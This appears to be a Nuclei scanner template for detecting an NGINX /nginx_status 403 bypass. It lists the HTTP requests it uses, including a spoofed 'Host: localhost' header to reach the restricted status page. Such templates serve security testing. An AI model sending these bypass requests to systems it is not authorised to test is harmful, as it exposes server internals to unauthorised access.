# Nuclei Template: Nginx Status Page - 403 Bypass
**Template ID:** nginx-status-403-bypass
**Vulnerability Class:** Path Traversal
**Severity:** Low
**CWE:** CWE-22
**Source:** Nuclei Template (`nginx-status-403-bypass.yaml`)

## Vulnerability Information & PoC

## Description
Detected an NGINX status disclosure and a 403 bypass that allowed unauthorized access to the /nginx_status endpoint.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/nginx_status
GET {{BaseURL}}{{paths}}
@Host: localhost
GET /nginx_status HTTP/1.1
Host: localhost
```

## References
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx
